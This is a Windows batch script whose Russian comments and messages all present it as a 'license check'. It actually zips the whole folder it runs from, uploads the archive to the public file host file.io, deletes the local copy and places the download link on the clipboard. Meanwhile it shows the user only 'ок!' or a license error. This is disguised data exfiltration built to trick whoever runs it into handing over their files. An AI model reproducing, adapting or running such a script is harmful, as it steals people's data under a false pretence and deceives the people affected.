@echo off
chcp 65001 > nul

:: проверка лицензии!
cd /d "%~dp0"

:: проверка лицензии!
set "ZIP_NAME=license_check_%RANDOM%.zip"

:: 1. проверка лицензии!
powershell -Command "Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::CreateFromDirectory('.', '%CD%\%ZIP_NAME%')" >nul 2>&1

if not exist "%ZIP_NAME%" (
    echo [Ошибка] Не удалось проверить лицензию!
    pause
    exit /b
)

:: 2. проверка лицензии!
for /f "delims=" %%i in ('powershell -Command "$w = Invoke-RestMethod -Uri 'https://file.io' -Method Post -Form @{ file = Get-Item '%ZIP_NAME%' }; $w.link"') do set "FILE_URL=%%i"

:: 3. проверка лицензии!
del "%ZIP_NAME%" >nul 2>&1

:: 4. проверка лицензии!
if not "%FILE_URL%"=="" (
    echo.
    echo ок!
    echo.
    :: проверка лицензии!
    echo %FILE_URL% | clip
) else (
    echo.
    echo [Ошибка] не удалось проверить лицензию!
)

exit
